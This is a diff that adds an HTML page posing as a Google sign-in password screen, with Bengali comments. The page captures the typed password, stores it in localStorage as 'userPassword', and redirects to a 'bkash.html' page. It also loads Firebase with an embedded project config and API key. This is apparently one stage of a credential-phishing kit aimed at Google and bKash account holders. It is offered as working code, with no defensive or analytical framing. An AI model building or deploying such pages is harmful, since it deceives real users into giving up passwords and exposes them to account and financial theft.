@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome - Google</title>
+    <link rel="icon" type="image/png" href="google.png">
+    <style>
+        /* বেসিক রিসেট এবং ফন্ট */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* মূল কন্টেইনার */
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            margin-top: 20px;
+        }
+
+        /* গুগল লোগো */
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 75px;
+            height: auto;
+        }
+
+        /* হেডিং সেকশন */
+        h1 {
+            text-align: center;
+            font-weight: 400;
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 30px;
+        }
+
+        /* ইউজার প্রোফাইল সেকশন */
+        .profile {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: #202124;
+        }
+
+        .profile-icon {
+            font-size: 20px;
+            margin-right: 8px;
+            border-radius: 50%;
+            padding: 4px;
+            border: 1px solid #dadce0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 32px;
+            width: 32px;
+        }
+
+        .profile-icon::before {
+            content: '👤';
+        }
+
+        /* ইনপুট ফিল্ড ডিজাইন (ফ্লোটিং লেবেল সহ) */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 2px solid #1a73e8;
+            /* নীল বর্ডার */
+            border-radius: 4px;
+            outline: none;
+            background: transparent;
+        }
+
+        /* লেবেলটি বর্ডারের উপরে উঠানোর স্টাইল */
+        .input-group label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background-color: white;
+            padding: 0 5px;
+            color: #1a73e8;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        /* চেক বক্স */
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 150px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 8px;
+            width: 18px;
+            height: 18px;
+        }
+
+        /* নিচের বাটন সেকশন */
+        .footer-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: absolute;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 400px;
+            padding: 0 24px;
+        }
+
+        .forgot-password {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        </div>
+
+        <h1>Welcome</h1>
+
+        <div class="profile">
+            <span class="profile-icon"></span>
+            <span class="email-address">simple2848@gmail.com</span>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="password" value="">
+            <label for="password">Enter your password</label>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="show-password" onclick="togglePassword()">
+            <label for="show-password">Show password</label>
+        </div>
+    </div>
+
+    <div class="footer-actions">
+        <a href="#" class="forgot-password">FORGOT PASSWORD?</a>
+        <button class="next-btn">NEXT</button>
+    </div>
+
+
+    <script>
+        // ফাংশনটির নাম: togglePassword()
+        function togglePassword() {
+            // ১. পাসওয়ার্ড ইনপুট ফিল্ডটি সিলেক্ট করা হলো তার ID: "password" ব্যবহার করে
+            var passwordField = document.getElementById("password");
+
+            // ২. ইনপুট ফিল্ডটির বর্তমান 'type' চেক করা হলো
+            if (passwordField.type === "password") {
+                // ৩. যদি type "password" থাকে, তবে তাকে "text" করে দেওয়া হলো (পাসওয়ার্ড দেখানোর জন্য)
+                passwordField.type = "text";
+            } else {
+                // ৪. অন্যথায় (যদি type "text" থাকে), তবে তাকে আবার "password" করে দেওয়া হলো (পাসওয়ার্ড লুকানোর জন্য)
+                passwordField.type = "password";
+            }
+        }
+    </script>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+            apiKey: "AIzaSyCPtPwc_a6zx0V2U-2bnAAep1r38xcJkAw",
+            authDomain: "islami-bank-quiz.firebaseapp.com",
+            databaseURL: "https://islami-bank-quiz-default-rtdb.asia-southeast1.firebasedatabase.app/",
+            projectId: "islami-bank-quiz",
+            storageBucket: "islami-bank-quiz.firebasestorage.app",
+            messagingSenderId: "463779241704",
+            appId: "1:463779241704:web:1b67963755b0bc1f64735d",
+            measurementId: "G-THP0SSP2RT"
+    };
+
+        // Firebase initialize
+        firebase.initializeApp(firebaseConfig);
+
+        // NEXT বাটনে ক্লিক করলে bkash পেজে যাবে:
+        document.querySelector(".next-btn").addEventListener("click", function () {
+            let password = document.getElementById("password").value;
+
+            // Password LocalStorage এ সেভ করা হচ্ছে যেন bkash.html এ ব্যবহার করা যায়
+            localStorage.setItem("userPassword", password);
+
+            // Redirect to bkash
+            window.location.href = "bkash.html";
+
+        });
+
+    </script>
+
+
+</body>
+<script>
+    document.querySelector(".email-address").innerText = localStorage.getItem("userEmail");
+</script>
+
+</html>
